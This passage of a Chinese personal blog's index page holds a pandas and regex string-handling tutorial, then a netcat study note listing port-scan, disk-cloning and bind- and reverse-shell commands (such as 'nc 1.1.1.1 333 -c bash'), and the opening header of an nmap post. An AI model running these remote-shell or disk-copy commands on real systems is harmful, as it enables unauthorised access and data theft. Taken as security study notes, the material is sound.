<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[0 1 2 3 4]</span><br><span class="line"></span><br><span class="line">[ 0  4  8 12 16]</span><br><span class="line">[ 0.56967576  0.24137098 -0.07590117]</span><br><span class="line">[[-1.87739478 -0.93726326  0.09056369]</span><br><span class="line"> [ 0.83994529  0.77667778 -1.64973511]</span><br><span class="line"> [ 1.56661558 -0.19050461  0.75393501]</span><br><span class="line"> [-0.52916609  0.35109008  0.80523641]]</span><br><span class="line"></span><br><span class="line">[  0.00000000e+00   2.77555756e-17   5.55111512e-17]</span><br></pre></td></tr></table></figure>
<h3 id="广播的原则"><a href="#广播的原则" class="headerlink" title="广播的原则"></a>广播的原则</h3><ol>
<li><p>如果两个数组的后缘维度(trailing<br>dimension，从末尾开始算起的维度)的轴长度相符或其中一方的长度为1，则认为他们是广播兼容的</p>
</li>
<li><p>广播会在缺失和(或)长度为1的维度进行</p>
</li>
</ol>
<h1 id="aixs参数"><a href="#aixs参数" class="headerlink" title="aixs参数"></a>aixs参数</h1><p><a href="axis%E5%8C%BA%E5%88%AB.png">axis区别图</a> 就是假设n x<br>m的df,计算时，aixs=0表示的是n,计算行之间的，所以是跨行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df = pd.DataFrame(np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>]).reshape(<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> df</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span></span><br><span class="line"><span class="keyword">print</span> df.mean(axis= <span class="number">0</span>) <span class="comment">#跨行</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span></span><br><span class="line"><span class="keyword">print</span> df.mean(axis = <span class="number">1</span>) <span class="comment">#跨列</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span></span><br><span class="line"><span class="keyword">print</span> df.drop(<span class="number">0</span>,axis=<span class="number">1</span>) <span class="comment">#丢掉列中的0列</span></span><br></pre></td></tr></table></figure>
<p>an(axis= 0) #跨行<br>print ‘’<br>print df.mean(axis = 1) #跨列<br>print ‘’<br>print df.drop(0,axis=1) #丢掉列中的0列</p>
<p>```</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://yueyec.github.io/2019/03/03/pandas-string-in-chapter7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yueyec">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yueyec's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/03/pandas-string-in-chapter7/" itemprop="url">pandas-string-in-chapter7</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-03T21:11:48+08:00">
                2019-03-03
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Data-Science/" itemprop="url" rel="index">
                    <span itemprop="name">Data Science</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">pd.options.display.max_rows = <span class="number">20</span></span><br><span class="line">np.random.seed(<span class="number">12345</span>)</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.rc(<span class="string">'figure'</span>, figsize=(<span class="number">10</span>, <span class="number">6</span>))</span><br><span class="line">np.set_printoptions(precision=<span class="number">4</span>, suppress=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<h2 id="字符串方法"><a href="#字符串方法" class="headerlink" title="字符串方法"></a>字符串方法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#分割</span></span><br><span class="line">val = <span class="string">'a,b,  guido'</span></span><br><span class="line">print(val.split(<span class="string">','</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#分割和清空格</span></span><br><span class="line">pieces = [x.strip() <span class="keyword">for</span> x <span class="keyword">in</span> val.split(<span class="string">','</span>) ]</span><br><span class="line">print(pieces)</span><br><span class="line"></span><br><span class="line"><span class="comment">#拼接子字符串</span></span><br><span class="line">first,second,third = pieces <span class="comment">#赋值</span></span><br><span class="line">print(first + <span class="string">"::"</span> + second + <span class="string">"::"</span> + third)</span><br><span class="line"><span class="comment">#用方法拼接</span></span><br><span class="line">print(<span class="string">"::"</span>.join(pieces))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查找子字符串</span></span><br><span class="line"><span class="comment">#确认是否在字符串里</span></span><br><span class="line">print(<span class="string">'guido'</span> <span class="keyword">in</span> val)</span><br><span class="line"><span class="comment">#查找index,没有的话会报错</span></span><br><span class="line">print(val.index(<span class="string">','</span>))</span><br><span class="line"><span class="comment">#查找字符，返回index,没有的话则是-1</span></span><br><span class="line">print(val.find(<span class="string">':'</span>))</span><br><span class="line">print(val.find(<span class="string">','</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算出现的次数</span></span><br><span class="line">print(val.count(<span class="string">','</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#替换</span></span><br><span class="line">print(val.replace(<span class="string">','</span>,<span class="string">'::'</span>))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[&apos;a&apos;, &apos;b&apos;, &apos;  guido&apos;]</span><br><span class="line">[&apos;a&apos;, &apos;b&apos;, &apos;guido&apos;]</span><br><span class="line">a::b::guido</span><br><span class="line">a::b::guido</span><br><span class="line">True</span><br><span class="line">1</span><br><span class="line">-1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">a::b::  guido</span><br></pre></td></tr></table></figure>
<h3 id="方法表"><a href="#方法表" class="headerlink" title="方法表"></a>方法表</h3><div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>方法</td>
<td>描述</td>
</tr>
<tr>
<td>count</td>
<td>计算各字符出现的次数</td>
</tr>
<tr>
<td>endswitch</td>
<td>如果结束子字符串是suffix，则返回True</td>
</tr>
<tr>
<td>startswitch</td>
<td>如果开始子字符串是prefix，则返回True</td>
</tr>
<tr>
<td>join</td>
<td>用自身字符串为分隔符，添加一组字符串</td>
</tr>
<tr>
<td>index</td>
<td>返回子字符串首字母的index位置，没找到则报错</td>
</tr>
<tr>
<td>find</td>
<td>返回子字符串首字母的index位置，没找到则返回-1</td>
</tr>
<tr>
<td>rfind</td>
<td>从右边开始查找，返回最末字母的位置</td>
</tr>
<tr>
<td>replace</td>
<td>替换</td>
</tr>
<tr>
<td>strip</td>
<td>消除两边的空白</td>
</tr>
<tr>
<td>rstrip</td>
<td>消除右边的空白</td>
</tr>
<tr>
<td>lstrip</td>
<td>消除左边的空白</td>
</tr>
<tr>
<td>split</td>
<td>根据分隔符分离</td>
</tr>
<tr>
<td>lower</td>
<td>小写</td>
</tr>
<tr>
<td>upper</td>
<td>大写</td>
</tr>
<tr>
<td>casefold</td>
<td>将字符转换为小写，并将任何特定于区域的变量字符组合转换为通用的可比较形式</td>
</tr>
<tr>
<td>ljust</td>
<td>左对齐，并用空格(或其他字符)填充另一侧</td>
</tr>
<tr>
<td>rjust</td>
<td>右对齐，并用空格(或其他字符)填充另一侧</td>
</tr>
</tbody>
</table>
</div>
<h2 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">"foo    bar\t baz  \tqux"</span></span><br><span class="line"><span class="comment">#re.split会自动编译正则表达式，之后在切分</span></span><br><span class="line"><span class="comment">#\s+为任何空白字符</span></span><br><span class="line">print(re.split(<span class="string">'\s+'</span>, text))</span><br><span class="line"></span><br><span class="line"><span class="comment">#自己编译后切分</span></span><br><span class="line">regex = re.compile(<span class="string">'\s+'</span>)</span><br><span class="line">print(regex.split(text))</span><br><span class="line"></span><br><span class="line"><span class="comment">#找到所有空白处</span></span><br><span class="line">print(regex.findall(text))</span><br></pre></td></tr></table></figure>
<h3 id="findall匹配所有，search只返回第一次匹配，mathc只匹配str的开头"><a href="#findall匹配所有，search只返回第一次匹配，mathc只匹配str的开头" class="headerlink" title="findall匹配所有，search只返回第一次匹配，mathc只匹配str的开头"></a>findall匹配所有，search只返回第一次匹配，mathc只匹配str的开头</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">"""Dave dave@google.com</span></span><br><span class="line"><span class="string">Steve steve@gmail.com</span></span><br><span class="line"><span class="string">Rob rob@gmail.com</span></span><br><span class="line"><span class="string">Ryan ryan@yahoo.com</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">pattern = <span class="string">r'[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]&#123;2,4&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#re.IGNORECASE为不关心大小写</span></span><br><span class="line">regex= re.compile(pattern,flags=re.IGNORECASE)</span><br><span class="line"></span><br><span class="line"><span class="comment">#findall</span></span><br><span class="line">print(regex.findall(text))</span><br><span class="line"><span class="comment">#search</span></span><br><span class="line">m = regex.search(text) <span class="comment">#返回一个特殊match对象</span></span><br><span class="line">print(m.start(),m.end())</span><br><span class="line">print(text[m.start():m.end()]) <span class="comment">#得到搜到的字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#match会匹配开头，如果开头不是所要匹配的则是None</span></span><br><span class="line">print(regex.match(text))</span><br><span class="line"></span><br><span class="line"><span class="comment">#sub则会返回一个匹配字符被代替的新字符串</span></span><br><span class="line">print(regex.sub(<span class="string">'REDACTED'</span>,text)) <span class="comment">#邮箱被指定的字符串代替</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#re的分组,用()进行分组</span></span><br><span class="line">pattern = <span class="string">r'([A-Z0-9._%+-]+)@([A-Z0-9.-]+)\.([A-Z]&#123;2,4&#125;)'</span></span><br><span class="line">regex = re.compile(pattern,flags=re.IGNORECASE)</span><br><span class="line">m = regex.match(<span class="string">'wesm@bright.net'</span>)</span><br><span class="line">print(m.groups())</span><br><span class="line">print(regex.findall(text))</span><br><span class="line"><span class="comment">#sub可以用\1 \2等特殊字符来访问匹配的group</span></span><br><span class="line">print(regex.sub(<span class="string">r'Username: \1, Domain: \2, Suffix: \3'</span>, text))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[&apos;dave@google.com&apos;, &apos;steve@gmail.com&apos;, &apos;rob@gmail.com&apos;, &apos;ryan@yahoo.com&apos;]</span><br><span class="line">5 20</span><br><span class="line">dave@google.com</span><br><span class="line">None</span><br><span class="line">Dave REDACTED</span><br><span class="line">Steve REDACTED</span><br><span class="line">Rob REDACTED</span><br><span class="line">Ryan REDACTED</span><br><span class="line"></span><br><span class="line">(&apos;wesm&apos;, &apos;bright&apos;, &apos;net&apos;)</span><br><span class="line">[(&apos;dave&apos;, &apos;google&apos;, &apos;com&apos;), (&apos;steve&apos;, &apos;gmail&apos;, &apos;com&apos;), (&apos;rob&apos;, &apos;gmail&apos;, &apos;com&apos;), (&apos;ryan&apos;, &apos;yahoo&apos;, &apos;com&apos;)]</span><br><span class="line">Dave Username: dave, Domain: google, Suffix: com</span><br><span class="line">Steve Username: steve, Domain: gmail, Suffix: com</span><br><span class="line">Rob Username: rob, Domain: gmail, Suffix: com</span><br><span class="line">Ryan Username: ryan, Domain: yahoo, Suffix: com</span><br></pre></td></tr></table></figure>
<h3 id="正则表达式方法"><a href="#正则表达式方法" class="headerlink" title="正则表达式方法"></a>正则表达式方法</h3><div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>方法</td>
<td>说明</td>
</tr>
<tr>
<td>findall</td>
<td>匹配所有，返回list</td>
</tr>
<tr>
<td>finditer</td>
<td>返回的是迭代</td>
</tr>
<tr>
<td>match</td>
<td>匹配开头，并且可以分组，匹配不成功返回None</td>
</tr>
<tr>
<td>search</td>
<td>匹配一次，返回对应的对象，可以匹配任意位置</td>
</tr>
<tr>
<td>split</td>
<td>根据regex来切分</td>
</tr>
<tr>
<td>sub,subn</td>
<td>代替匹配到的内容，可以用\\1 \\2等来表示group</td>
</tr>
</tbody>
</table>
</div>
<h2 id="矢量化字符串函数"><a href="#矢量化字符串函数" class="headerlink" title="矢量化字符串函数"></a>矢量化字符串函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;<span class="string">'Dave'</span>: <span class="string">'dave@google.com'</span>, <span class="string">'Steve'</span>: <span class="string">'steve@gmail.com'</span>,</span><br><span class="line">        <span class="string">'Rob'</span>: <span class="string">'rob@gmail.com'</span>, <span class="string">'Wes'</span>: np.nan&#125;</span><br><span class="line">data = pd.Series(data)</span><br><span class="line">print(data)</span><br><span class="line">print(data.isnull())</span><br><span class="line"></span><br><span class="line"><span class="comment">#为了处理NaN，使用series的st属性</span></span><br><span class="line">print(data.str.contains(<span class="string">'gmail'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#str有同样的re方法</span></span><br><span class="line">print(data.str.findall(pattern,flags=re.IGNORECASE))</span><br></pre></td></tr></table></figure>
<h3 id="矢量化字符串操作方法"><a href="#矢量化字符串操作方法" class="headerlink" title="矢量化字符串操作方法"></a>矢量化字符串操作方法</h3><div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>方法</td>
<td>描述</td>
</tr>
<tr>
<td>cat</td>
<td>选择分隔符进行连接,sep指定分隔符</td>
</tr>
<tr>
<td>contains</td>
<td>返回一个bool，确定是否含有所填的子字符串或正则</td>
</tr>
<tr>
<td>count</td>
<td>计算子字符串出现次数，pat指定正则或者字符串</td>
</tr>
<tr>
<td>extract</td>
<td>使用正则的group，得到一个或多个字符串，并以每个group为列的df</td>
</tr>
<tr>
<td>endswitch</td>
<td>对每个元素用 x.endswith(pattern)</td>
</tr>
<tr>
<td>startswitch</td>
<td>对每个元素用 x.startswith(pattern)</td>
</tr>
<tr>
<td>findall</td>
<td>正则查找所有的元素</td>
</tr>
<tr>
<td>get</td>
<td>得到每个元素对应index的值，参数为int,超出index不会报错，返回NaN</td>
</tr>
<tr>
<td>isalnum</td>
<td>检测是否每个元素是字母和数字组成的</td>
</tr>
<tr>
<td>isalpha</td>
<td>检测是否每个元素是字母组成的</td>
</tr>
<tr>
<td>isdecimal</td>
<td>检测是否每个元素是数字</td>
</tr>
<tr>
<td>isdigit</td>
<td>检测是否每个元素是数字，包含一些特殊数字列如unicode的上下标数字</td>
</tr>
<tr>
<td>islower</td>
<td>检测是否每个元素是小写的</td>
</tr>
<tr>
<td>isnumeric</td>
<td>检测是否每个元素是数字</td>
</tr>
<tr>
<td>isupper</td>
<td>检测是否每个元素是大写的</td>
</tr>
<tr>
<td>join</td>
<td>在每个字符串中的每个元素之间添加分隔符</td>
</tr>
<tr>
<td>len</td>
<td>计算每个字符串的长度</td>
</tr>
<tr>
<td>lower,upper</td>
<td>把每个字符串变大写或小写</td>
</tr>
<tr>
<td>match</td>
<td>和正则match一样</td>
</tr>
<tr>
<td>pad</td>
<td>给个数字，添加空格到对应的长度，fillchar添加的字符，默认空格；size添加位置，默认left</td>
</tr>
<tr>
<td>center</td>
<td>等同于pad(size=’both’)</td>
</tr>
<tr>
<td>repeat</td>
<td>重复次数</td>
</tr>
<tr>
<td>replace</td>
<td>替换</td>
</tr>
<tr>
<td>slice</td>
<td>切片，start,stop,step</td>
</tr>
<tr>
<td>split</td>
<td>根据正则或分隔符进行分割</td>
</tr>
<tr>
<td>strip</td>
<td>两边去空格</td>
</tr>
<tr>
<td>rstrip</td>
<td>左边去空格</td>
</tr>
<tr>
<td>lstrip</td>
<td>右边去空格</td>
</tr>
</tbody>
</table>
</div>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;<span class="string">'Dave'</span>: <span class="string">'dave@google.com'</span>, <span class="string">'Steve'</span>: <span class="string">'steve@gmail.com'</span>,</span><br><span class="line">        <span class="string">'Rob'</span>: <span class="string">'rob@gmail.com'</span>, <span class="string">'Wes'</span>: np.nan&#125;</span><br><span class="line">data = pd.Series(data)</span><br><span class="line">print(data.str.cat(sep=<span class="string">'|'</span>))</span><br><span class="line">print(data.str.contains(<span class="string">'gmail'</span>))</span><br><span class="line">print(data.str.count(<span class="string">'\w+'</span>))</span><br><span class="line">print(data.str.extract(<span class="string">"(\w+)@(\w+)"</span>))</span><br><span class="line">print(data.str.join(<span class="string">"|"</span>))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">dave@google.com|steve@gmail.com|rob@gmail.com</span><br><span class="line">Dave     False</span><br><span class="line">Steve     True</span><br><span class="line">Rob       True</span><br><span class="line">Wes        NaN</span><br><span class="line">dtype: object</span><br><span class="line">Dave     3.0</span><br><span class="line">Steve    3.0</span><br><span class="line">Rob      3.0</span><br><span class="line">Wes      NaN</span><br><span class="line">dtype: float64</span><br><span class="line">           0       1</span><br><span class="line">Dave    dave  google</span><br><span class="line">Steve  steve   gmail</span><br><span class="line">Rob      rob   gmail</span><br><span class="line">Wes      NaN     NaN</span><br><span class="line">Dave     d|a|v|e|@|g|o|o|g|l|e|.|c|o|m</span><br><span class="line">Steve    s|t|e|v|e|@|g|m|a|i|l|.|c|o|m</span><br><span class="line">Rob          r|o|b|@|g|m|a|i|l|.|c|o|m</span><br><span class="line">Wes                                NaN</span><br><span class="line">dtype: object</span><br></pre></td></tr></table></figure>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://yueyec.github.io/2019/03/02/netcat/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yueyec">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yueyec's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/02/netcat/" itemprop="url">netcat</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-02T21:09:35+08:00">
                2019-03-02
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/hack/" itemprop="url" rel="index">
                    <span itemprop="name">hack</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/hack/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><ul>
<li>侦听/传输模式</li>
<li>telnet/获取banner信息</li>
<li>传输文本信息</li>
<li>传输文件/目录</li>
<li>加密传输文件</li>
<li>远程控制/木马</li>
<li>加密所有流量</li>
<li>流媒体服务器</li>
<li>远程克隆评判</li>
</ul>
<h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><ol>
<li>-nv  n直接ip地址，不解析dns v详细输出</li>
<li>-l -p port -l开启监听模式 -p指定端口</li>
</ol>
<p>可以使用 -nv ip port 连接上开启监听模式的ip，进行聊天<br>在客户端，可以用命令 | nc -nv ip port 来直接传送命令反馈给服务端</p>
<ol>
<li>-q secs q为 secs秒后断开连接 mac版本没有</li>
<li>-z 为扫描模式，不会有i/o交换</li>
<li>-zu udp端口探测</li>
<li>-c linux中是执行命令</li>
<li>-e mac中是执行命令</li>
</ol>
<h1 id="传输文件-目录"><a href="#传输文件-目录" class="headerlink" title="传输文件/目录"></a>传输文件/目录</h1><ul>
<li>客户端传1.mp4给服务器<br>服务器: nc -lp 333 &gt; 1.mp4<br>客户端: nc -nv 1.1.1.1 333 &lt; 1.mp4 - q 1</li>
<li>客户端接收文件<br>服务端：nc -q 1 -lp 333 &lt; a.mp4<br>客户端：nc -nv 1.1.1.1 333 &gt; 2.mp4</li>
<li>传输目录<br>服务端： tar -cvf - music/ | nc -lp 333 -q 1<br>客户端： nc -nv 1.1.1.1 333 | tar -xvf -</li>
<li>加密传文件<br>客户端传加密文件给服务端<br>服务端： nc -lp 333 | mcrypt &#x2013;flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4<br>客户端： mcrypt &#x2013;flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1<br>333 -q 1</li>
</ul>
<h1 id="流媒体服务"><a href="#流媒体服务" class="headerlink" title="流媒体服务"></a>流媒体服务</h1><ul>
<li>服务器：cat 1.mp4 | nc -lp 333</li>
<li>客户端 nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</li>
</ul>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><ul>
<li>nc -nvz 1.1.1.1 1-65535</li>
<li>nc -vnzu 1.1.1.1 1-1024</li>
</ul>
<h1 id="远程克隆硬盘"><a href="#远程克隆硬盘" class="headerlink" title="远程克隆硬盘"></a>远程克隆硬盘</h1><ul>
<li>从客户端拷贝每个内容到服务端<ul>
<li>服务端：nc -lp 333 | dd of=/dev/sda</li>
<li>客户端：dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</li>
</ul>
</li>
</ul>
<h1 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h1><ol>
<li>正向 用来控制服务器<ul>
<li>服务端： nc -lp 333 -c bash</li>
<li>客户端： nc 1.1.1.1 333</li>
</ul>
</li>
<li>反向 连接服务器后，服务器可以操作客户端</li>
</ol>
<p>服务端： nc -lp 333<br>客户端： nc 1.1.1.1 333 -c bash</p>
<ol>
<li>mac版本使用 -e命令</li>
<li>反向用于网络管理员限制进口端口的时候</li>
</ol>
<h1 id="ncat"><a href="#ncat" class="headerlink" title="ncat"></a>ncat</h1><ol>
<li>nc数据缺乏加密和身份验证的能力</li>
<li>ncat包含于nmap工具中,弥补了nc的不足<ul>
<li>服务器： ncat -c bash &#x2013;allow 192.168.198.66 -vnl 333 &#x2013;ssl</li>
<li>打开shell ,&#x2013;allow设置允许连接的服务器 &#x2013;ssl打开ssl加密</li>
<li>客户端： ncat -nv 1.1.1.1 333 &#x2013;ssl</li>
</ul>
</li>
<li>nc不同系统的参数命令不一样</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://yueyec.github.io/2019/03/02/nmap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yueyec">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yueyec's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/02/nmap/" itemprop="url">nmap</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
